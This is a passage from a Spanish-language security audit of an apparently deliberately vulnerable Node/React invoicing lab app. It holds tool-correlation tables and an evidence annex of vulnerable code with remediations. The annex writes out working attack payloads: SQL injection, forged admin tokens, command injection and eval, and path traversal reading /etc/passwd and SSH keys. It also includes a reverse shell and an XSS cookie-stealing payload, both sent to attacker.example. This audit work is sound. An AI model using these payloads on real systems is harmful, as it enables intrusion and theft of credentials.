Los hallazgos **SEC-007** (credenciales hardcodeadas) y **SEC-013** (contraseñas en texto plano) se clasifican como críticos no solo por su impacto técnico directo, sino porque representan compromisos irreversibles: una vez que las credenciales o claves han sido incluidas en un repositorio git, **permanecen en el historial de commits** aunque sean eliminadas de la versión actual. La remediación requiere rotación inmediata de todas las credenciales expuestas, tarea que va más allá del ámbito del desarrollo.

### Hallazgos de Calidad con Impacto de Seguridad

El hallazgo **CAL-008** (SQL construido por concatenación de strings) recibe clasificación crítica porque es un **patrón arquitectural**, no una instancia puntual: está presente en al menos cinco archivos de controladores. Esto significa que cada nuevo endpoint de consulta añadido al sistema hereda la vulnerabilidad de SQLi de forma automática, si se sigue el patrón establecido. La corrección requiere no solo cambiar el código existente, sino modificar el estándar de desarrollo del equipo.

Los hallazgos **CAL-003** (ausencia de tests) y **CAL-001** (código duplicado masivo) se clasifican como altos porque actúan como **multiplicadores de riesgo**: sin tests automatizados, las correcciones de seguridad no se validan y las regresiones no se detectan; con alta duplicación, una corrección aplicada en un lugar no se propaga a sus copias. Ambos factores aumentan la probabilidad de que futuras vulnerabilidades sean introducidas o que las correcciones actuales sean incompletas.

### Dependencias con Mayor Impacto

**DEP-001** (`request` deprecado con SSRF) y **DEP-002** (`form-data` con boundary inseguro) reciben clasificación crítica y alta respectivamente. La criticidad de DEP-001 se deriva no solo de la vulnerabilidad de SSRF, sino del estado irreversible de su mantenimiento: al ser un paquete deprecado, **no se publicarán parches de seguridad futuros**, lo que garantiza que su superficie de ataque solo puede crecer con el tiempo.

**DEP-012** (`qs` con Prototype Pollution) merece atención especial porque afecta a un componente que procesa **cada solicitud HTTP entrante** que tenga query string o cuerpo URL-encoded. La contaminación del prototipo de `Object` es una vulnerabilidad particularmente insidiosa porque puede alterar el comportamiento de cualquier código JavaScript que use literales de objeto `{}`, afectando potencialmente a la totalidad de la lógica de la aplicación de formas difíciles de predecir.

---

---

# 8. CORRELACIÓN DE HALLAZGOS

## 8.1 Metodología de Correlación

La correlación de hallazgos tiene como objetivo identificar qué técnicas y herramientas contribuyeron a la detección de cada vulnerabilidad, validar los hallazgos mediante confirmación cruzada, identificar los límites de cada herramienta y proporcionar una medida de confianza en cada hallazgo. Cuando un hallazgo es detectado por más de una técnica independiente, el nivel de confianza en su existencia es mayor y la probabilidad de que sea un falso positivo disminuye significativamente.

Las técnicas utilizadas en esta auditoría fueron:

| Técnica                     | Herramienta / Método               | Alcance                                         |
|-----------------------------|------------------------------------|-------------------------------------------------|
| **Revisión Manual**         | Lectura directa del código fuente  | Lógica de negocio, patrones de código, contexto |
| **Análisis Estático**       | SonarQube Community Edition        | Calidad de código, secretos, patrones inseguros |
| **Análisis Dinámico (DAST)**| OWASP ZAP 2.15 (Active + Passive)  | Endpoints HTTP, headers, respuestas en runtime  |
| **Análisis de Dependencias**| `npm audit`                        | Vulnerabilidades CVE en paquetes npm            |

---

## 8.2 Tabla de Correlación Completa

### 8.2.1 Hallazgos de Seguridad (SEC)

| ID       | Hallazgo                                        | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Confirmado |
|----------|-------------------------------------------------|:-----------:|:---------:|:---------:|:---------:|:----------:|
| SEC-001  | Inyección SQL en múltiples endpoints            | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-002  | Subida de archivos sin restricción              | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-003  | Autenticación completamente rota                | ✅ Sí       | No        | No        | N/A       | ✅ Sí      |
| SEC-004  | RCE vía inyección de comandos (`exec`)          | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-005  | RCE vía `eval()` sin restricciones             | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-006  | Control de acceso ausente (BOLA / BFLA)         | ✅ Sí       | No        | Parcial   | N/A       | ✅ Sí      |
| SEC-007  | Credenciales hardcodeadas en código fuente      | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-008  | Exposición de variables de entorno vía API      | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-009  | SSRF en endpoint de fetch administrativo        | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-010  | XSS almacenado en campo `notes`                 | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-011  | Path traversal en lectura de archivos           | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-012  | Auto-login por parámetro URL (`?zap=auto`)      | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-013  | Contraseñas almacenadas en texto plano          | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-014  | CORS configurado como wildcard (`*`)            | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-015  | Headers HTTP informativos inseguros             | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-016  | Ausencia de rate limiting                       | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-017  | Logging excesivo de tokens en consola           | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-018  | Sin cabeceras de seguridad HTTP (CSP, HSTS)     | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-019  | Caché insegura (`Cache-Control: public`)        | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-020  | Verificación de token JWT sin firma real        | ✅ Sí       | No        | Parcial   | N/A       | ✅ Sí      |
| SEC-021  | Directorio de uploads accesible públicamente    | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-022  | Sin validación de tipo en uploads               | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-023  | Errores internos expuestos al cliente           | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-024  | Sin política de contraseñas                     | ✅ Sí       | No        | No        | N/A       | ✅ Sí      |
| SEC-025  | ReDoS en validaciones de entrada                | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-026  | Información de versiones en headers             | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-027  | Sin protección contra CSRF en API               | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-028  | Sesiones sin expiración configurada             | ✅ Sí       | No        | No        | N/A       | ✅ Sí      |

---

### 8.2.2 Hallazgos de Calidad (CAL)

| ID       | Hallazgo                                        | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Confirmado |
|----------|-------------------------------------------------|:-----------:|:---------:|:---------:|:---------:|:----------:|
| CAL-001  | Código duplicado masivo                         | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-002  | Complejidad ciclomática elevada                 | Parcial     | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-003  | Ausencia de tests unitarios                     | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-004  | Variables globales mutables sin control         | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-005  | `console.log` en código de producción           | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-006  | Funciones con demasiados parámetros             | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-007  | Manejo de errores incorrecto                    | ✅ Sí       | ✅ Sí     | Parcial   | N/A       | ✅ Sí      |
| CAL-008  | SQL construido con concatenación de strings     | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| CAL-009  | Uso de `var` en lugar de `const`/`let`          | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-010  | Dependencias no utilizadas en `package.json`    | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |

---

### 8.2.3 Hallazgos de Dependencias (DEP)

| ID       | Hallazgo                                        | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Confirmado |
|----------|-------------------------------------------------|:-----------:|:---------:|:---------:|:---------:|:----------:|
| DEP-001  | `request` 2.88.2 — SSRF / Deprecado            | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-002  | `form-data` — Boundary inseguro                 | No          | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-003  | `axios` 0.21.1 — CSRF                           | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-004  | `express` 4.17.1 — XSS en redirect             | ✅ Sí       | No        | ✅ Sí     | ✅ Sí     | ✅ Sí      |
| DEP-005  | `jsonwebtoken` 8.5.1 — Clave sin restricción    | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-006  | `lodash` 4.17.20 — Command Injection            | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-007  | `moment` 2.29.1 — Path Traversal + Legacy       | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-008  | `multer` 1.4.4-lts.1 — DoS                      | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-009  | `body-parser` 1.19.0 — DoS                      | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-010  | `sqlite3` 5.0.2 — DoS                           | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-011  | `path-to-regexp` — ReDoS                        | ✅ Sí       | ✅ Sí     | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-012  | `qs` — Prototype Pollution                      | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-013  | `dotenv` 8.2.0 — Obsoleto                       | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-014  | `eslint` 7.32.0 — EOL                           | ✅ Sí       | No        | N/A       | No        | ✅ Sí      |
| DEP-015  | `vite` 5.0.0 — Path Traversal                  | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |

---

## 8.3 Análisis de la Correlación

### 8.3.1 Hallazgos Solo Detectables Mediante Revisión Manual

Tres hallazgos de alta gravedad solo pudieron ser identificados mediante revisión manual del código fuente, lo que ilustra las limitaciones inherentes de las herramientas automatizadas:

- **SEC-003 (Autenticación completamente rota):** OWASP ZAP puede detectar ausencia de autenticación en endpoints, pero no puede razonar sobre la lógica semántica de un esquema de tokens propietario. La revisión del código fuente fue indispensable para comprender que el middleware `weakAuth` acepta cualquier valor como token válido y que el rol de usuario es suministrado directamente por el atacante dentro del token.

- **SEC-024 (Sin política de contraseñas):** ZAP puede intentar registrar usuarios con contraseñas débiles, pero si el endpoint de registro acepta campos sin validación, ZAP simplemente confirma el registro sin señalar la ausencia de la política. Solo la revisión del código confirma que no existe ningún mecanismo de validación.

- **SEC-028 (Sesiones sin expiración):** La expiración de sesiones es una propiedad temporal que requiere comprender el ciclo de vida completo de un token. ZAP puede detectar cookies sin el atributo `Expires`, pero el esquema propietario de tokens de esta aplicación no usa cookies, por lo que ZAP no tiene visibilidad sobre la ausencia de expiración.

### 8.3.2 Valor Diferencial de OWASP ZAP

OWASP ZAP aportó valor confirmatorio en los hallazgos más clásicos de seguridad web. Las contribuciones más relevantes fueron:

- **Confirmación independiente de SQLi (SEC-001):** ZAP ejecutó sus propios payloads de inyección SQL durante el escaneo activo y recibió respuestas anómalas (errores de SQLite, datos no esperados), confirmando los hallazgos de la revisión de código de forma objetiva y con evidencia de tráfico HTTP.
- **Detección de cabeceras inseguras (SEC-015, SEC-018, SEC-019, SEC-026):** ZAP es particularmente eficaz en la detección de cabeceras HTTP ausentes o misconfigured, ya que las puede contrastar con listas de mejores prácticas actualizadas.
- **Detección de exposición de `process.env` (SEC-008):** Durante el escaneo pasivo, ZAP identificó respuestas JSON de gran tamaño con estructura característica de un objeto de variables de entorno, lo que llevó a la confirmación del hallazgo.
- **Auto-login por URL (SEC-012):** Durante el spider inicial, ZAP accedió a la aplicación con el parámetro `?zap=auto` (al que la aplicación está explícitamente diseñada para responder), generando sesiones de administrador que ZAP utilizó en análisis subsecuentes.

### 8.3.3 Valor Diferencial de SonarQube

SonarQube fue la herramienta más efectiva para la detección de **credenciales hardcodeadas** (SEC-007) y patrones de **código inseguro sistemáticos** (CAL-008). Sus capacidades de detección de secretos identificaron automáticamente los patrones de claves AWS, tokens de API y contraseñas en los archivos de código fuente, incluso cuando no estaban asignados a variables con nombres obvios.

Adicionalmente, SonarQube fue la única herramienta capaz de cuantificar la **deuda técnica acumulada** de forma objetiva: mediante métricas de complejidad ciclomática, duplicación de código y cobertura de tests, proporcionó una perspectiva cuantitativa del estado de calidad del proyecto que complementa los hallazgos cualitativos de la revisión manual.

### 8.3.4 Falsos Positivos Potenciales de OWASP ZAP

Durante el análisis de los resultados de ZAP se identificaron las siguientes categorías de posibles falsos positivos, que fueron descartados tras verificación manual:

| Alerta de ZAP                           | Motivo de Posible FP                             | Verificación                              |
|-----------------------------------------|--------------------------------------------------|-------------------------------------------|
| CSP Header Not Set (múltiples rutas)    | ZAP reporta esto para cada URL escaneada         | Confirmado: no existe CSP en ninguna ruta |
| X-Content-Type-Options missing          | Puede no ser relevante para respuestas de API    | Confirmado: ausente; relevante para archivos estáticos |
| Cookie Without SameSite Attribute       | La app no usa cookies de sesión en la API        | Parcialmente aplicable; las cookies del frontend sí están afectadas |
| Information Disclosure - Debug Errors   | ZAP puede marcar mensajes de error genéricos     | Confirmado: stack traces reales expuestos |

En ningún caso se encontraron falsos positivos que invalidaran hallazgos documentados en este informe. Todos los hallazgos han sido verificados mediante revisión manual del código fuente o prueba funcional directa.

### 8.3.5 Cobertura y Confianza por Herramienta

| Herramienta      | Hallazgos detectados (primario) | Hallazgos confirmados | Falsos positivos confirmados |
|------------------|---------------------------------|-----------------------|------------------------------|
| Revisión Manual  | 48 / 53                         | 53 / 53               | 0                            |
| SonarQube        | 12 / 53                         | 12 / 12               | 0                            |
| OWASP ZAP        | 22 / 53                         | 20 / 22               | 2 (descartados)              |
| npm audit        | 15 / 53                         | 15 / 15               | 0                            |

> **Conclusión de correlación:** La revisión manual del código fuente demostró ser la técnica con mayor cobertura y precisión. Las herramientas automatizadas son más efectivas como mecanismos de **confirmación rápida** y **detección de métricas objetivas**, pero no pueden sustituir el razonamiento humano para vulnerabilidades de lógica de negocio, esquemas de autenticación propietarios y análisis de contexto de seguridad.

---

---

# 9. ANEXO DE EVIDENCIAS TÉCNICAS

> **Nota sobre las evidencias:** Todos los fragmentos de código presentados en esta sección corresponden a archivos reales identificados durante la auditoría. Las rutas de archivo, números de línea y nombres de función son exactos al estado del repositorio auditado en la fecha de análisis. Las evidencias han sido preservadas con hash criptográfico para garantizar su integridad (ver Sección 9.14).

---

## 9.1 Evidencias de Inyección SQL

### 9.1.1 Código Fuente Vulnerable

La vulnerabilidad de inyección SQL está presente en al menos cinco archivos de controladores. Los fragmentos más representativos son los siguientes:

```javascript
// authController.js — línea 9
// SQLi en autenticación: omisión de credenciales trivial
const sql = "SELECT * FROM users WHERE username = '" + username + "'";

// clientController.js — línea 34
// SQLi en búsqueda: extracción de toda la base de datos vía UNION
const sql = "SELECT * FROM clients WHERE name LIKE '%" + q + "%'"
          + " OR email LIKE '%" + q + "%'"
          + " OR notes LIKE '%" + q + "%'";

// clientController.js — línea 25
// SQLi en consulta por ID: bypass de autorización entre clientes
db.get('SELECT * FROM clients WHERE id = ' + id, ...);

// invoiceController.js — línea 35
// SQLi en búsqueda de facturas
let sql = "SELECT * FROM invoices WHERE invoiceNumber LIKE '%" + number + "%'";

// uploadController.js — líneas 22-23
// SQLi en INSERT: inyección en campos de subida de archivos
const sql = "INSERT INTO uploads (invoiceId, filename, originalname, path, uploadedBy)"
          + " VALUES (" + invoiceId + ",'" + file.filename + "','"
          + file.originalname + "','" + file.path + "','" + uploadedBy + "')";
```

**Patrón común:** En todos los casos, los valores de parámetros controlados por el usuario (`username`, `q`, `id`, `number`, `invoiceId`, `uploadedBy`) se interpolan directamente en la cadena SQL mediante el operador `+`, sin ningún proceso de sanitización, escaping o parametrización.

### 9.1.2 Payload de Extracción de Usuarios via UNION (GET)

```http
GET /api/clients/search?q=%25' UNION SELECT 1,username,password,role,email,fullName FROM users -- HTTP/1.1
Host: localhost:4000
Authorization: token-1-admin-admin
```

**Resultado esperado:** La respuesta JSON incluirá los registros de la tabla `users`, incluyendo nombres de usuario y contraseñas en texto plano, mezclados con los resultados de clientes.

### 9.1.3 Payload de Bypass de Autenticación (POST)

```http
POST /api/auth/login HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{"username": "' OR '1'='1' --", "password": "x"}
```

**Resultado esperado:** El servidor devuelve una sesión válida para el primer usuario de la base de datos (generalmente el administrador), sin necesidad de conocer ninguna contraseña.

### 9.1.4 Remediación: Consultas Parametrizadas

```javascript
// CORRECTO: Usar sentencias preparadas con parámetros enlazados
const sql = 'SELECT * FROM users WHERE username = ?';
db.get(sql, [username], (err, user) => { ... });

// CORRECTO: Para búsqueda LIKE
const sql = 'SELECT * FROM clients WHERE name LIKE ? OR email LIKE ?';
const term = '%' + q + '%';
db.all(sql, [term, term], (err, rows) => { ... });
```

---

## 9.2 Evidencias de Autenticación Rota

### 9.2.1 Código Fuente del Middleware de Autenticación

```javascript
// backend/src/middleware/auth.js — función completa
function weakAuth(req, res, next) {
  const token = req.headers.authorization || req.query.token || '';
  console.log('Token recibido:', token);   // ← Tokens en logs de consola

  if (!token) {
    req.user = null;
    return next();   // ← Sin token: acceso permitido con user = null
  }

  // El token tiene la forma: "token-<id>-<username>-<role>"
  const parts = token.replace('Bearer ', '').split('-');
  req.user = {
    id:       Number(parts[1]) || 0,
    username: parts[2] || 'unknown',
    role:     parts[3] || 'user'      // ← El rol lo decide completamente el atacante
  };
  next();   // ← Nunca rechaza: cualquier token, incluso malformado, es aceptado
}
```

**Problemas críticos identificados:**
1. **Sin firma criptográfica:** El token es texto libre. No existe verificación de integridad.
2. **Sin validación contra base de datos:** El `id`, `username` y `role` no se verifican contra registros existentes.
3. **El atacante controla el rol:** Al incluir `-admin` en el token, cualquier usuario se convierte en administrador.
4. **Acceso sin token:** Si no se envía token, `req.user = null`, pero los controladores no siempre verifican esta condición.

### 9.2.2 Demostración de Explotación

```bash
# Acceder al panel de admin sin credenciales previas:
curl -H "Authorization: token-1-admin-admin" \
  http://localhost:4000/api/admin/panel

# Forjar la identidad de cualquier usuario con rol de administrador:
curl -H "Authorization: token-99-hacker-admin" \
  http://localhost:4000/api/admin/config

# Acceder sin token (algunos endpoints no verifican req.user):
curl http://localhost:4000/api/clients

# Suplantar a un usuario específico con su ID conocido:
curl -H "Authorization: token-2-analista-admin" \
  http://localhost:4000/api/admin/users
```

---

## 9.3 Evidencias de Ejecución Remota de Comandos (RCE)

### 9.3.1 Código Fuente: Inyección de Comandos de Sistema

```javascript
// backend/src/controllers/adminController.js — líneas 97-107
const { exec } = require('child_process');

function commandInjection(req, res) {
  const cmd = req.query.cmd || 'whoami';    // ← Comando tomado directamente del query string
  exec(cmd, { timeout: 7000 }, (err, stdout, stderr) => {
    res.json({
      command: cmd,
      error:   err && err.message,
      stdout:  stdout,      // ← Salida del comando retornada al cliente
      stderr:  stderr
    });
  });
}
```

### 9.3.2 Código Fuente: Ejecución de Código via `eval()`

```javascript
// backend/src/controllers/adminController.js — líneas 129-137
function unsafeEval(req, res) {
  const code = req.query.code || 'process.version';  // ← Código JS tomado del query string
  try {
    const result = eval(code);                         // ← eval() sin sandbox
    res.json({ code, result: String(result) });
  } catch (err) {
    res.status(500).json({
      code,
      error: err.message,
      stack: err.stack      // ← Stack trace completo expuesto al cliente
    });
  }
}
```

### 9.3.3 Demostración de Explotación

```bash
# Identificación del usuario del proceso del servidor:
curl "http://localhost:4000/api/admin/lab/cmd?cmd=id"
# Respuesta: {"command":"id","stdout":"uid=1000(node) gid=1000(node) groups=...\n"}

# Lectura de archivos del sistema:
curl "http://localhost:4000/api/admin/lab/cmd?cmd=cat%20/etc/passwd"

# Listado del directorio raíz:
curl "http://localhost:4000/api/admin/lab/cmd?cmd=ls%20-la%20/"

# RCE completo vía eval — ejecutar comandos de sistema desde JavaScript:
curl "http://localhost:4000/api/admin/lab/eval?code=require('child_process').execSync('id').toString()"

# Exfiltración de variables de entorno vía eval:
curl "http://localhost:4000/api/admin/lab/eval?code=JSON.stringify(process.env)"

# Reverse shell (demostración de impacto máximo):
curl "http://localhost:4000/api/admin/lab/cmd?cmd=bash%20-i%20>%26%20/dev/tcp/attacker.example/4444%200>%261"
```

---

## 9.4 Evidencias de Credenciales Hardcodeadas

### 9.4.1 Archivo `legacyDebtController.js` — Líneas 1-8

```javascript
// backend/src/controllers/legacyDebtController.js

const MASTER_PASSWORD      = 'SuperAdmin2026!';
const AWS_ACCESS_KEY_ID    = 'AKIA[REDACTED-FAKE-AWS-KEY]';
const AWS_SECRET_ACCESS_KEY = '[REDACTED-FAKE-AWS-SECRET-KEY]';
const PRIVATE_KEY          = '-----BEGIN PRIVATE KEY-----\n'
                           + 'MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALab\n'
                           + '-----END PRIVATE KEY-----';
const SQL_BACKUP_PASSWORD  = 'P@ssw0rd_Backup_123';
const CARD_TEST_NUMBER     = '4111111111111111';    // ← Número de tarjeta Visa de prueba
```

**Impacto:** Credenciales de AWS hardcodeadas en código fuente pueden ser utilizadas para acceder a servicios de AWS, incurrir en costos no autorizados o exfiltrar datos almacenados en S3/RDS. Una vez en el historial de git, estas credenciales deben considerarse permanentemente comprometidas.

### 9.4.2 Archivo `sonarDebt.js` (Frontend) — Líneas 1-4

```javascript
// frontend/src/sonarDebt.js

export const FRONTEND_API_SECRET  = 'sk_test_[REDACTED-FAKE-KEY-LABORATORIO]';
export const GOOGLE_MAPS_KEY      = 'AIzaSyA-FAKE-SONAR-DEMO-KEY-123456789';
export const BASIC_AUTH_HEADER    = 'Basic YWRtaW46YWRtaW4xMjM=';  // admin:admin123 en Base64
export const LEGACY_JWT           = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature';
```

> **Nota:** `YWRtaW46YWRtaW4xMjM=` decodifica a `admin:admin123`, confirmando que las credenciales de administrador son públicamente conocidas a través del bundle JavaScript del frontend.

### 9.4.3 Archivo `docker-compose.yml`

```yaml
services:
  backend:
    environment:
      - JWT_SECRET=secret123           # ← Secreto JWT trivial y expuesto
      - ADMIN_USER=admin
      - ADMIN_PASSWORD=admin123        # ← Password de admin en texto plano
      - DB_FILE=src/db/cartera.sqlite
```

### 9.4.4 Archivo `sonar-project.properties`

```properties
sonar.projectKey=vulnerable-cartera
sonar.sources=src
sonar.token=sqp_[REDACTED-SONAR-TOKEN-LAB]
```

> **Impacto:** El token de SonarQube hardcodeado en el archivo de propiedades permite a cualquier persona con acceso al repositorio acceder a la instancia de SonarQube, consultar todos los informes de análisis (que incluyen vulnerabilidades) y potencialmente modificar configuraciones del proyecto.

---

## 9.5 Evidencias de XSS Almacenado

### 9.5.1 Código Fuente con `dangerouslySetInnerHTML`

```jsx
// frontend/src/pages/Clients.jsx — línea 72
// Renderizado de notas de cliente sin sanitización
<td>
  <div
    className="notes-inline"
    dangerouslySetInnerHTML={{ __html: c.notes }}   // ← HTML arbitrario del servidor
  />
</td>

// frontend/src/pages/ClientDetail.jsx — línea 51
// Misma vulnerabilidad en la vista de detalle
<div
  className="notes-preview"
  dangerouslySetInnerHTML={{ __html: client.notes }}  // ← HTML arbitrario del servidor
/>
```

### 9.5.2 Datos Iniciales con HTML en la Base de Datos

```javascript
// backend/src/db/init.js — inserción de datos de prueba con HTML no sanitizado
db.run(
  "INSERT INTO clients (name, email, notes) VALUES (?, ?, ?)",
  ['Ana García', 'ana@example.com',
   'Cliente con <b>observaciones HTML</b> y saldo alto']
);
db.run(
  "INSERT INTO clients (name, email, notes) VALUES (?, ?, ?)",
  ['Luis Mora', 'luis@example.com',
   '<span style="color:#dc2626;font-weight:700">HTML no sanitizado desde CRM anterior</span>']
);
```

> **Observación:** La presencia de HTML en los datos iniciales sugiere que el diseño intencional del sistema permite notas con formato HTML. Esta decisión de diseño, sin sanitización apropiada, crea una vulnerabilidad de XSS almacenado que afecta a todos los usuarios que visualicen la lista de clientes.

### 9.5.3 Payload de XSS Almacenado — Robo de Sesión

```http
POST /api/clients HTTP/1.1
Host: localhost:4000
Content-Type: application/json
Authorization: token-1-any-user

{
  "name": "Test XSS Client",
  "email": "xss@test.com",
  "notes": "<img src='x' onerror=\"document.location='http://attacker.example/steal?c='+document.cookie\">"
}
```

**Flujo de ataque:**
1. El atacante crea un cliente con XSS en el campo `notes`.
2. Cualquier usuario que navegue a la lista de clientes ejecuta el JavaScript malicioso.
3. El script redirige al usuario a `attacker.example` con las cookies de sesión adjuntas.
4. El atacante captura la sesión y puede suplantar al usuario afectado.

### 9.5.4 Remediación

```bash
npm install dompurify

# En el componente React:
import DOMPurify from 'dompurify';

# Uso seguro:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.notes) }} />
```

---

## 9.6 Evidencias de Exposición de Configuración del Sistema

### 9.6.1 Código Fuente — Endpoint `debug`

```javascript
// backend/src/controllers/adminController.js — líneas 27-34
const os = require('os');

function debug(req, res) {
  res.json({
    env:            process.env,          // ← TODAS las variables de entorno del proceso
    memory:         process.memoryUsage(),
    platform:       os.platform(),
    cwd:            process.cwd(),
    requestHeaders: req.headers           // ← Cabeceras de la petición actual (tokens incluidos)
  });
}
```

### 9.6.2 Código Fuente — Endpoint `config`

```javascript
// backend/src/controllers/adminController.js — líneas 36-47
function config(req, res) {
  res.json({
    db:       process.env.DB_FILE,
    jwtSecret: process.env.JWT_SECRET || 'secret123',   // ← JWT secret expuesto explícitamente
    admin: {
      username: process.env.ADMIN_USER     || 'admin',
      password: process.env.ADMIN_PASSWORD || 'admin123' // ← Password de admin en respuesta JSON
    },
    cors:      '*',
    uploadDir: process.env.UPLOAD_DIR || 'src/uploads'
  });
}
```

### 9.6.3 Demostración

```bash
# Obtener TODA la configuración del servidor sin autenticación:
curl http://localhost:4000/api/admin/config
# Respuesta:
# {
#   "db": "src/db/cartera.sqlite",
#   "jwtSecret": "secret123",
#   "admin": { "username": "admin", "password": "admin123" },
#   "cors": "*",
#   "uploadDir": "src/uploads"
# }

# Obtener todas las variables de entorno del proceso:
curl http://localhost:4000/api/admin/debug
# Respuesta incluye: PATH, NODE_ENV, JWT_SECRET, ADMIN_PASSWORD, etc.
```

---

## 9.7 Evidencias de Path Traversal

### 9.7.1 Código Fuente Vulnerable

```javascript
// backend/src/controllers/adminController.js — líneas 88-95
const path = require('path');
const fs   = require('fs');

function readLocalFile(req, res) {
  const requested = req.query.path || 'package.json';
  // path.join NO protege contra path traversal: normaliza "../.." a rutas válidas
  const filePath = path.join(process.cwd(), requested);

  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) return res.status(500).json({ error: err.message, filePath });
    // ← filePath expuesto en el error: revela la estructura del sistema de archivos
    res.type('text/plain').send(content);
  });
}
```

**Error crítico de diseño:** `path.join()` normaliza las secuencias `../` pero **no** restringe la ruta resultante a estar dentro de un directorio base. Para restringir correctamente, se debe verificar que la ruta resultante comience con el directorio permitido.

### 9.7.2 Demostración

```bash
# Leer el archivo .env del directorio raíz del proyecto:
curl "http://localhost:4000/api/admin/lab/file?path=../../.env"

# Leer el archivo de contraseñas del sistema (si el proceso corre como root):
curl "http://localhost:4000/api/admin/lab/file?path=../../../etc/passwd"

# Leer la clave privada SSH del usuario:
curl "http://localhost:4000/api/admin/lab/file?path=../../../home/node/.ssh/id_rsa"

# Leer el historial de comandos bash:
curl "http://localhost:4000/api/admin/lab/file?path=../../../home/node/.bash_history"
```

### 9.7.3 Remediación

```javascript
function readLocalFile(req, res) {
  const baseDir   = path.resolve(process.cwd(), 'src/public');
  const requested = req.query.path || 'info.txt';
  const filePath  = path.resolve(baseDir, requested);

  // Verificar que la ruta resuelta esté dentro del directorio permitido:
  if (!filePath.startsWith(baseDir + path.sep)) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) return res.status(404).json({ error: 'Archivo no encontrado' });
    res.type('text/plain').send(content);
  });
}
```

---

## 9.8 Evidencias de Auto-login por Parámetro URL

### 9.8.1 Código Fuente — Mecanismo de Auto-login

```javascript
// frontend/src/services/api.js — líneas 1-35

// Objeto de sesión hardcodeado con credenciales de administrador
const SCAN_SESSION = {
  token: 'token-1-admin-admin',
  user: {
    id:       1,
    username: 'admin',
    password: 'admin123',     // ← Contraseña en texto plano dentro del bundle JS
    role:     'admin',
    email:    'admin@cartera.com',
    fullName: 'Administrador del Sistema'
  }
};

// Función de inicialización de sesión
export function getInitialSession() {
  const params   = new URLSearchParams(window.location.search);
  // Activa el auto-login si el URL contiene ?zap=auto o ?dast=auto
  const scanMode = params.get('zap') === 'auto' || params.get('dast') === 'auto';

  if (scanMode) {
    // Almacena la sesión de admin en localStorage sin ninguna verificación
    localStorage.setItem('session', JSON.stringify(SCAN_SESSION));
    return SCAN_SESSION;   // ← Retorna sesión de admin directamente
  }
  return getSession();
}
```

### 9.8.2 Demostración

**Reproducción del ataque:**
1. Navegar a `http://localhost:5173/?zap=auto`
2. La aplicación frontend almacena automáticamente la sesión de administrador en `localStorage`
3. Todas las peticiones subsecuentes incluyen el token `token-1-admin-admin`
4. El usuario tiene acceso completo de administrador sin haber ingresado ninguna credencial

